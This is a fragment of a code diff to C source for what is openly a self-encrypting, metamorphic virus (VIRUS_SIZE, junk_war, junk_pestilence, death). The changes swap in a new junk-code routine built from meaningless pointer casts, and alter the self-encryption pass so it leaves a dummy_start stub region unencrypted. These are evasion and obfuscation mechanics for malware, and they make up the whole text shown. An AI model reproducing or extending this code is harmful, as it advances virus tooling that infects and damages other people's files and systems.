@@ -11,6 +11,7 @@
 extern void __attribute__((naked)) _start(void);
 extern void end(void);
 extern int64_t g_key;
+extern void dummy_start(void);
 
 #define VIRUS_SIZE (uintptr_t)&end - (uintptr_t)&_start
 
@@ -25,24 +26,18 @@ void junk_war(void);
 void junk_pestilence(void);
 
 void junk_death(void) {
-	char a;
-	char b;
-	char c;
-
-	a = 1; 
-	b = 2;
-	c = 3;
-
+	char c = 'A';
+	char *pc = &c;
+	char **ppc = &pc;
+	char ***pppc = &ppc;
+	char *weird = *(char **)(*(char ***) &pppc);
+	int result = *(int *)&weird * *(int *)&weird;
 	for (int i = 0; i < 100; i++) {
-		a += b;
-		b += c;
-		c += a;
-		if (a > b) {
-			a = b;
-		} else if (b > c) {
-			b = c;
-		} else if (c > a) {
-			c = a;
+		result += *(int *)&weird;
+		if (result > 0) {
+			result = *(int *)&weird;
+		} else if (result < 0) {
+			result = *(int *)&weird;
 		}
 	}
 }
@@ -316,13 +311,14 @@ int death(int start_offset, int64_t key, file_t *file) { JUNK;
 	char *self_name = file->abs_path;
 	int fd = -1;
 	bool is_encrypted = (start_offset != 0x1000) ? true : false;
+	uint16_t dummy_offset	= (uintptr_t)&dummy_start - (uintptr_t)&_start;
 
 	uint8_t *entry = self + start_offset;
 
 	if (is_encrypted) {
-		encrypt(entry, VIRUS_SIZE, key);
+		encrypt(entry + dummy_offset, VIRUS_SIZE - dummy_offset, key);
 		replace_nop(entry, g_junk_offsets);
-		encrypt(entry, VIRUS_SIZE, key);
+		encrypt(entry + dummy_offset, VIRUS_SIZE - dummy_offset, key);
 	} else {
 		write_self_pos(entry);
 		replace_nop(entry, g_junk_offsets);
